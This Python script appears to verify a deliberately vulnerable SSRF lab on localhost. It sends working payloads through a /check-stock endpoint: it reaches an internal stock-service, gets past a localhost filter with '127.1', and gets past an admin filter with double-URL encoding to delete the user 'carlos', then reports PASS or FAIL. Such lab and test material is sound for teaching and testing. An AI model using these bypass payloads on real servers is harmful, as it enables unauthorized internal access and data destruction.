import json
import sys
import requests

BASE_URL = "http://localhost:8000"
CHECK_STOCK_URL = f"{BASE_URL}/check-stock"


def check_web_app_up() -> bool:
    print("[*] Checking if web-app is up at / ...")
    try:
        resp = requests.get(BASE_URL + "/", timeout=5)
    except Exception as e:
        print("[!] web-app is NOT reachable.")
        print(f"    Error: {e}")
        return False

    print(f"[+] web-app responded with status {resp.status_code}")
    return 200 <= resp.status_code < 500


def try_direct_stock_service() -> None:
    print("\n[*] Trying to reach stock-service directly from host (should fail)...")
    try:
        resp = requests.get("http://stock-service:8001/stock/1", timeout=5)
        print("[!] Unexpectedly reached stock-service directly!")
        print(f"    Status: {resp.status_code}")
        print(f"    Body:   {resp.text}")
    except Exception as e:
        print("[+] As expected, could not reach stock-service directly.")
        print(f"    Error: {e}")


def ssrf_internal_stock() -> bool:
    """
    Use the vulnerable /check-stock endpoint to reach the internal stock-service.
    This is the "actual" SSRF: server-side HTTP to an internal host the client
    cannot reach directly.
    """
    print("\n[*] Verifying basic SSRF to internal stock-service via /check-stock ...")

    payload = {
        "stockApi": "http://stock-service:8001/stock/1"
    }

    try:
        resp = requests.post(CHECK_STOCK_URL, json=payload, timeout=10)
    except Exception as e:
        print("[!] Request to /check-stock failed.")
        print(f"    Error: {e}")
        return False

    print(f"[+] /check-stock returned HTTP {resp.status_code}")

    try:
        data = resp.json()
    except json.JSONDecodeError:
        print("[!] Response from /check-stock is not JSON:")
        print(resp.text)
        return False

    print("[+] Parsed JSON from /check-stock:")
    print(json.dumps(data, indent=2))

    stock_info = data.get("stock_info", "")
    status_code = data.get("status_code")

    ok = (
        status_code is not None
        and 200 <= status_code < 400
        and "internal-warehouse-01" in stock_info
    )

    if ok:
        print("\n[!!!] BASIC SSRF CONFIRMED:")
        print("      The web-app contacted the internal stock-service and leaked its response.")
        return True
    else:
        print("\n[?] Did not see expected internal stock-service marker.")
        print("    Check that stock-service is running and /stock/1 returns the marker.")
        return False


def test_localhost_blocked() -> bool:
    """
    Test that direct localhost access is blocked.
    """
    print("\n[*] Testing that http://127.0.0.1/ is blocked...")

    payload = {
        "stockApi": "http://127.0.0.1/"
    }

    try:
        resp = requests.post(CHECK_STOCK_URL, json=payload, timeout=10)
    except Exception as e:
        print("[!] Request to /check-stock failed.")
        print(f"    Error: {e}")
        return False

    print(f"[+] /check-stock returned HTTP {resp.status_code}")

    try:
        data = resp.json()
    except json.JSONDecodeError:
        print("[!] Response from /check-stock is not JSON:")
        print(resp.text)
        return False

    # Check if the request was blocked (should not get a successful response)
    status_code = data.get("status_code")
    if status_code is None or status_code >= 400:
        print("[+] Confirmed: http://127.0.0.1/ is blocked as expected")
        return True
    else:
        print("[!] Unexpected: http://127.0.0.1/ was not blocked")
        return False


def test_localhost_bypass() -> bool:
    """
    Test that the localhost bypass using http://127.1:8000/ works.
    """
    print("\n[*] Testing localhost bypass using http://127.1:8000/...")

    payload = {
        "stockApi": "http://127.1:8000/"
    }

    try:
        resp = requests.post(CHECK_STOCK_URL, json=payload, timeout=10)
    except Exception as e:
        print("[!] Request to /check-stock failed.")
        print(f"    Error: {e}")
        return False

    print(f"[+] /check-stock returned HTTP {resp.status_code}")

    try:
        data = resp.json()
    except json.JSONDecodeError:
        print("[!] Response from /check-stock is not JSON:")
        print(resp.text)
        return False

    # Check if the bypass worked (should get a successful response)
    status_code = data.get("status_code")
    if status_code is not None and 200 <= status_code < 400:
        print("[+] Confirmed: localhost bypass using http://127.1:8000/ works")
        return True
    else:
        print("[!] Localhost bypass using http://127.1:8000/ did not work")
        return False


def test_admin_blocked() -> bool:
    """
    Test that direct admin access is blocked.
    """
    print("\n[*] Testing that http://127.1:8000/admin is blocked...")

    payload = {
        "stockApi": "http://127.1:8000/admin"
    }

    try:
        resp = requests.post(CHECK_STOCK_URL, json=payload, timeout=10)
    except Exception as e:
        print("[!] Request to /check-stock failed.")
        print(f"    Error: {e}")
        return False

    print(f"[+] /check-stock returned HTTP {resp.status_code}")

    try:
        data = resp.json()
    except json.JSONDecodeError:
        print("[!] Response from /check-stock is not JSON:")
        print(resp.text)
        return False

    # Check if the admin request was blocked
    status_code = data.get("status_code")
    if status_code is None or status_code >= 400:
        print("[+] Confirmed: http://127.1:8000/admin is blocked as expected")
        return True
    else:
        print("[!] Unexpected: http://127.1:8000/admin was not blocked")
        return False


def test_admin_bypass_and_exploit() -> bool:
    """
    Test the admin bypass using double-URL encoding and verify the exploit works.
    """
    print("\n[*] Testing admin bypass using double-URL encoding (%2561dmin)...")

    # Use double-URL encoded 'a' to bypass admin filter
    payload = {
        "stockApi": "http://127.1:8000/%2561dmin/delete?username=carlos"
    }

    try:
        resp = requests.post(CHECK_STOCK_URL, json=payload, timeout=10)
    except Exception as e:
        print("[!] Request to /check-stock failed.")
        print(f"    Error: {e}")
        return False

    print(f"[+] /check-stock returned HTTP {resp.status_code}")

    try:
        data = resp.json()
    except json.JSONDecodeError:
        print("[!] Response from /check-stock is not JSON:")
        print(resp.text)
        return False

    print("[+] Parsed JSON from admin bypass attempt:")
    print(json.dumps(data, indent=2))

    status_code = data.get("status_code")
    stock_info = data.get("stock_info", "")

    # Check if the admin bypass worked and the user was deleted
    if status_code is not None and 200 <= status_code < 400:
        print("\n[!!!] ADMIN BYPASS AND EXPLOIT CONFIRMED:")
        print("      Successfully bypassed admin filter using double-URL encoding")
        print("      and accessed the admin delete functionality")
        return True
    else:
        print("\n[!] Admin bypass using double-URL encoding failed")
        print(f"    status_code: {status_code}")
        print(f"    response: {stock_info[:200]}")
        return False


if __name__ == "__main__":
    all_ok = True

    if not check_web_app_up():
        all_ok = False

    try_direct_stock_service()

    if not ssrf_internal_stock():
        all_ok = False

    # Test the exploit path as described in the hint/solution
    if not test_localhost_blocked():
        all_ok = False

    if not test_localhost_bypass():
        all_ok = False

    if not test_admin_blocked():
        all_ok = False

    if not test_admin_bypass_and_exploit():
        all_ok = False

    if all_ok:
        print("\n=== VERIFY RESULT: PASS ===")
        sys.exit(0)
    else:
        print("\n=== VERIFY RESULT: FAIL ===")
        sys.exit(1)
